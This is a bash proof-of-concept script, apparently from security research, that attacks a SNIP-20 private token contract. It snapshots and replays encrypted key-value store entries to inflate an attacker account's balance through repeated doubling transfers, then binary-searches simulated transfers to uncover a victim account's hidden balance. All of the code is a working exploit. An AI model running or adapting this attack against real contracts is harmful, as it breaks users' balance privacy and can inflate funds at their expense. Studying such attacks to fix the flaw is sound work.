#!/bin/bash

set -x
set -e

source ./scripts/demo_utils.sh
source ./scripts/local_test_params.sh

CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
CODE_HASH=$(cat $BACKUP/codeHash.txt)

snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
set_snapshot "${snapshot_uniq_label}-start"

# ACC2 is the victim
rm -r $BACKUP/victim_key
rm -f $BACKUP/adv_key
rm -f $BACKUP/adv_value
touch $BACKUP/victim_key
touch $BACKUP/adv_key
touch $BACKUP/adv_value


# get boosting key and value
generate_and_sign_transfer $ACC1 $ACC0 1 snip20_getkey
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store
simulate_tx snip20_getkey
res=$(cat $BACKUP/simulate_result)
echo $res
tag=$(sed '5q;d' $BACKUP/kv_store)
key=${tag:6:-1}
tag=$(sed '6q;d' $BACKUP/kv_store)
value=${tag:8:-1}

# boost balance of ACC1
echo $key > $BACKUP/backup_adv_key
echo $value > $BACKUP/backup_adv_value

set_snapshot "${snapshot_uniq_label}-boost"
amount=10000

for i in {1..114}; do
    generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_boost_1
    cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
    cp -f $BACKUP/backup_adv_value $BACKUP/adv_value

    simulate_tx snip20_boost_1
    res1=$(cat $BACKUP/simulate_result)
    echo $res1

    amount=$(echo $(python -c "print ${amount}*2"))
    generate_and_sign_transfer $ACC0 $ACC1 $amount snip20_boost_2
    rm -f $BACKUP/adv_key
    rm -f $BACKUP/adv_value
    touch $BACKUP/adv_key
    touch $BACKUP/adv_value

    rm -f $BACKUP/kv_store
    touch $BACKUP/kv_store
    simulate_tx snip20_boost_2
    res2=$(cat $BACKUP/simulate_result)
    echo $res2
    tag=$(sed '4q;d' $BACKUP/kv_store)
    echo $tag
    value=${tag:8:-1} 
    echo $value > $BACKUP/backup_adv_value

    echo $amount $i
done

amount=$(echo $(python -c "print 2**128-1-${amount}"))
generate_and_sign_transfer $ACC0 $ACC1 $amount snip20_boost_1
cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
cp -f $BACKUP/backup_adv_value $BACKUP/adv_value

simulate_tx snip20_boost_1
res3=$(cat $BACKUP/simulate_result)
echo $res3

# probe victim balance
amount=$(echo $(python -c "print 2**128-1"))
generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_getkey
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store
simulate_tx snip20_getkey
res4=$(cat $BACKUP/simulate_result)
echo $res4
tag=$(sed '3q;d' $BACKUP/kv_store)
key=${tag:6:-1}
tag=$(sed '4q;d' $BACKUP/kv_store)
value=${tag:8:-1}

echo $key > $BACKUP/backup_adv_key
echo $value > $BACKUP/backup_adv_value

lo=0
hi=$(echo $(python -c "print 2**128-1"))
cnt=0
while [ $(echo $(python -c "print ${hi}-${lo}")) != "0" ]; do
    midv=$(echo $(python -c "print ((${hi}+${lo}+1))//2"))
    echo $lo $hi $midv

    cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
    cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
    set_snapshot "${snapshot_uniq_label}-${cnt}"
    
    generate_and_sign_transfer $ACC1 $ACC2 $midv snip20_adv
    
    simulate_tx snip20_adv
    res=$(cat $BACKUP/simulate_result)


    if [ $res != 0 ]; then hi=$(echo $(python -c "print ${midv}-1")); else lo=$midv; fi
  cnt=$((cnt + 1))
done

echo $(python -c "print 2**128-1-${lo}")
